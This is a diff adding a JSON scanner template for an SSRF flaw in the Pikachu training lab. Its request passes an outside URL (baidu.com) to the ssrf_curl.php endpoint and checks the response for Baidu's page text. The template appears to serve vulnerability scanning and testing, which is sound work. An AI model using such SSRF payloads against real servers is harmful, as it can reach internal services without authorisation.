@@ -1,0 +1,26 @@
+{
+    "name": "pikachu",
+    "vuln": "SSRF_curl",
+    "version": "",
+    "comment": "仅需要多次发包验证的设置mainRequest字段2,否则都以1为准,多次发包依次延续",
+    "type": "1",
+    "mainRequest": {
+        "1": {
+            "request": {
+                "host": "",
+                "method": "GET",
+                "path": "/vul/ssrf/ssrf_curl.php?url=http://www.baidu.com",
+                "cookie": "",
+                "requestheader": "",
+                "requestbody": ""
+            },
+            "response": {
+                "statuscode": 200,
+                "statusmessage": "",
+                "responsetime": "",
+                "responseheader": "",
+                "responsebody": "百度一下"
+            }
+        }
+    }
+}
